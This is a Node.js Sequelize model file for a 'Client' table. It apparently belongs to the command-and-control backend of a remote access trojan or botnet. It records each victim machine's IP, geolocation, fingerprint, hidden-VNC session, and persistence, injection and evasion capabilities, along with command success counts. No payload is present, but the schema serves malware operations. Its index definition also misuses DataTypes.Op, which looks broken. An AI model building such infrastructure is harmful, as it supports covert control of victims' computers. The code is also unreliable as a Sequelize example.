const { DataTypes } = require('sequelize');
const { sequelize } = require('../config/database');

const Client = sequelize.define('Client', {
    id: {
        type: DataTypes.UUID,
        defaultValue: DataTypes.UUIDV4,
        primaryKey: true
    },
    uuid: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true
    },
    computerName: {
        type: DataTypes.STRING,
        allowNull: false
    },
    ipAddress: {
        type: DataTypes.STRING,
        allowNull: false
    },
    country: {
        type: DataTypes.STRING,
        defaultValue: 'Unknown'
    },
    geoLocation: {
        type: DataTypes.JSONB,
        defaultValue: {}
    },
    hostname: {
        type: DataTypes.STRING
    },
    platform: {
        type: DataTypes.STRING
    },
    operatingSystem: {
        type: DataTypes.ENUM('windows', 'linux', 'macos', 'android', 'ios', 'unknown'),
        defaultValue: 'unknown'
    },
    osVersion: {
        type: DataTypes.STRING,
        defaultValue: 'Unknown'
    },
    architecture: {
        type: DataTypes.ENUM('x86', 'x64', 'arm', 'arm64', 'unknown'),
        defaultValue: 'unknown'
    },
    capabilities: {
        type: DataTypes.JSONB,
        defaultValue: {
            persistence: [],
            injection: [],
            evasion: [],
            commands: [],
            features: []
        }
    },
    hvncSession: {
        type: DataTypes.JSONB,
        defaultValue: null
    },
    authToken: {
        type: DataTypes.STRING,
        defaultValue: ''
    },
    lastHeartbeat: {
        type: DataTypes.DATE,
        defaultValue: DataTypes.NOW
    },
    connectionCount: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    systemInfo: {
        type: DataTypes.JSONB,
        defaultValue: {}
    },
    lastActiveTime: {
        type: DataTypes.DATE,
        defaultValue: DataTypes.NOW
    },
    additionalSystemDetails: {
        type: DataTypes.TEXT,
        defaultValue: ''
    },
    status: {
        type: DataTypes.ENUM('online', 'offline'),
        defaultValue: 'offline'
    },
    machineFingerprint: {
        type: DataTypes.STRING,
        unique: true,
        allowNull: true
    },
    firstSeen: {
        type: DataTypes.DATE,
        defaultValue: DataTypes.NOW
    },
    connectedAt: {
        type: DataTypes.DATE
    },
    disconnectedAt: {
        type: DataTypes.DATE
    },
    uptimeSeconds: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    bootTime: {
        type: DataTypes.DATE
    },
    commandSuccess: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    commandFailed: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    avgLatencyMs: {
        type: DataTypes.FLOAT,
        defaultValue: 0
    },
    // Legacy fields for backward compatibility
    ip: {
        type: DataTypes.STRING
    },
    lastSeen: {
        type: DataTypes.DATE
    }
}, {
    tableName: 'clients',
    timestamps: true,
    indexes: [
        {
            unique: true,
            fields: ['uuid']
        },
        {
            unique: true,
            fields: ['machineFingerprint'],
            where: {
                machineFingerprint: {
                    [DataTypes.Op.ne]: null
                }
            }
        },
        {
            fields: ['status', 'lastHeartbeat']
        },
        {
            fields: ['machineFingerprint', 'uuid']
        }
    ]
});

module.exports = Client;
